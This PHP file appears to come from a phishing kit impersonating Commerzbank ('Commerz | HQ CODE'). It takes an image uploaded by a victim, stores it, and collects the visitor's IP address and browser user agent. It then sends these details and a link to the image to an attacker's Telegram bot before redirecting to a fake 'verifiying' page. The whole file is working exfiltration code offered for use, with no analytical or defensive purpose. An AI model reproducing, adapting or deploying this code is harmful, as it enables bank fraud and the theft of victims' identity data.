<?php
include "../config/telegram.php";
include "../config/settings.php";

// Define the upload directory (ensure it exists and is writable)
$uploadDir = '../uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Allowed file types
$allowTypes = ['jpg', 'jpeg', 'png'];

if (isset($_FILES['file']) && !empty($_FILES['file']['name'])) {
    $uploadFile = basename($_FILES['file']['name']);
    $uploadPath = $uploadDir . $uploadFile;

    // Extract file extension
    $fileExt = strtolower(pathinfo($uploadFile, PATHINFO_EXTENSION));
    
    // Get file info
    $fileInfo = new finfo(FILEINFO_MIME_TYPE);
    $mimeType = $fileInfo->file($_FILES['file']['tmp_name']);
    $allowedMimeTypes = ['image/jpeg', 'image/png'];

    // Validate file type and MIME type
    if (!in_array($fileExt, $allowTypes) || !in_array($mimeType, $allowedMimeTypes)) {
        echo "Error: The file type is not allowed.";
        exit();
    }

    // Check if file upload is successful
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        $ip = getenv("REMOTE_ADDR");
        $user_os = php_uname('s'); // Fetch OS info
        $user_browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

        // Prepare Telegram message
        $message = "[=====>  🏦  Commerz  |  HQ CODE  🏦  <=====]\n\n";
        $message .= "[The Image address:\n http://" . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '\\/') . '/' . $uploadPath . "\n";
        $message .= "[Filename: " . htmlspecialchars($_FILES['file']['name']) . "\n";
        $message .= "[Type: " . htmlspecialchars($_FILES['file']['type']) . "\n";
        $message .= "[Size: " . htmlspecialchars($_FILES['file']['size']) . " bytes\n";
        $message .= "[Error: " . htmlspecialchars($_FILES['file']['error']) . "\n\n";
        $message .= "[=====> INFROMATIONS <=====]\n\n";
        $message .= "[ IP : $ip\n";
        $message .= "[ OS : $user_os\n";
        $message .= "[ Browser : $user_browser\n";
        $message .= "[ UA : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

        // Send message via Telegram
        foreach ($IdTelegram as $chatId) {
            $website = "https://api.telegram.org/bot" . $botToken;
            $params = [
                'chat_id' => $chatId,
                'text' => $message,
            ];

            $ch = curl_init($website . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);

            if ($result === false) {
                error_log("Telegram API error: " . curl_error($ch));
            }

            curl_close($ch);
        }

        // Redirect to the next page
        header("Location: ../verifiying.php");
        exit();
    } else {
        echo '<b>Error: Unable to upload the file.</b>';
    }
} else {
    echo '<b>Error: No file uploaded.</b>';
}
?>
